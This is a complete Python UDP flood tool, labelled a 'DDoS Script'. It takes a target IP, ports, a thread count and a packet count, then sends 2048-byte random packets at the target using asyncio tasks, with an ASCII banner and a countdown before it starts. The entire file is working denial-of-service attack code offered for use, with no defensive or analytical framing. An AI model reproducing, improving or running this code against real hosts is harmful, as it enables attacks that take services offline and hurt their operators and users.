import os
import time
import socket
import random
import asyncio
import argparse

LICENSE = """
# DDoS Script
# Copyright (c) 2023 SSL-ACTX
# Licensed under the MIT License
"""

class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

class AttackThread:
    def __init__(self, ip, port, num_packets):
        self.ip = ip
        self.port = port
        self.num_packets = num_packets
        self.packets_sent = 0

    async def attack(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_to_send = random._urandom(2048)
        sent = 0

        try:
            while sent < self.num_packets:
                sock.sendto(bytes_to_send, (self.ip, self.port))
                sent += 1
                self.packets_sent += 1
                print(f"Port {self.port}: Packets sent: {self.packets_sent}", end="\r")
                await asyncio.sleep(0.001)
        except KeyboardInterrupt:
            pass

async def run_attacks(ip, ports, num_threads, num_packets):
    tasks = []

    for port in ports:
        for _ in range(num_threads):
            thread = AttackThread(ip, port, num_packets)
            task = asyncio.create_task(thread.attack())
            tasks.append(task)

    await asyncio.gather(*tasks)

def countdown():
    for i in range(3, 0, -1):
        print("Starting attack in %d seconds..." % i, end="\r")
        time.sleep(1)

def show_ascii_header():
    header = """
   _____   __    __                 __
  /  _  \_/  |__/  |______    ____ |  | __
 /  /_\  \   __\   __\__  \ _/ ___\|  |/ /
/    |    \  |  |  |  / __ \\  \___|    <
\____|__  /__|  |__| (____  /\___  >__|_ \\
        \/                \/     \/     \/
        Use at your own risk! :v
    """
    print(header)

def main():
    parser = argparse.ArgumentParser(description="Simple DDoS script")
    parser.add_argument("ip", help="Target IP address")
    parser.add_argument("-p", "--ports", nargs='+', type=int, help="Target ports (space-separated)")
    parser.add_argument("-t", "--threads", type=int, default=1, help="Number of threads to use")
    parser.add_argument("-n", "--packets", type=int, default=100, help="Number of packets to send")
    args = parser.parse_args()

    show_ascii_header()

    try:
        socket.inet_aton(args.ip)
    except socket.error:
        print("Invalid IP address.")
        return

    if args.ports is None or not all(0 <= port <= 65535 for port in args.ports):
        print("Invalid port number(s). Ports should be between 0 and 65535.")
        return

    os.system("clear")
    show_ascii_header()
    print("\n" + Colors.OKGREEN + "\nAuthor   : SSL-ACTX")
    print("GitHub   : " + Colors.OKBLUE + "https://github.com/SSL-ACTX")

    countdown()
    os.system("clear")
    print("\nAttacking %s:%s with %d threads" % (args.ip, ', '.join(map(str, args.ports)), args.threads))

    asyncio.run(run_attacks(args.ip, args.ports, args.threads, args.packets))
    print("\nAttack completed.                                  ")

if __name__ == "__main__":
    print(LICENSE)
    main()